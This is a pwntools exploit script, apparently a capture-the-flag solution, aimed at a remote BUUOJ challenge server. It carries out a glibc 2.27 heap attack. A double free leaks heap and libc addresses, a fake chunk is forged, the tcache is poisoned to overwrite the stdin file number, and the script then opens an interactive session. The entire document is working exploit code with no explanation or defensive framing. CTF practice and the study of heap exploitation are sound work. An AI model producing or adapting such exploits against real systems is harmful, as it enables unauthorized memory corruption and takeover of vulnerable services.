from pwn import *

io=remote('node3.buuoj.cn',28987)
libc=ELF('./libc-2.27.so')

def add(type,num):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('>')
    io.sendline(str(type))
    io.recvuntil('number:')
    io.sendline(str(num))

def free(type):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('>')
    io.sendline(str(type))

def show(type):
    io.recvuntil('> ')
    io.sendline('3')
    io.recvuntil('>')
    io.sendline(str(type))


add(1,100)
free(1) 
add(2,0xa1)
free(1)
show(1)
io.recvuntil('number :')
heap=int(io.recvline())
if heap<0:
    heap=heap+0xffffffff+1
print(hex(heap))
add(1,str(heap+0x40))
add(1,100)
add(1,0x11111111) #fake_chunk  
 
#free(1)
#add(1,0x11111111)
#free(2)
#add(2,0xa1)

for i in range(7):
    free(1)
    add(2,0x21)


free(1)
show(1)
io.recvuntil('number :')
libc_leak=int(io.recvline())
if libc_leak<0:
    libc_leak=libc_leak+0xffffffff+1
print(hex(libc_leak))
stdin_fileno=libc.sym['_IO_2_1_stdin_']+0x70
off=0x3ebca0-stdin_fileno

add(2, 0)
free(2)
add(1, 0)
free(2)
add(2, heap - 0x260 + 0x2f0)
add(1, libc_leak - 0x230)
add(2, 0)
add(2, 0)
add(2, 666)

io.interactive()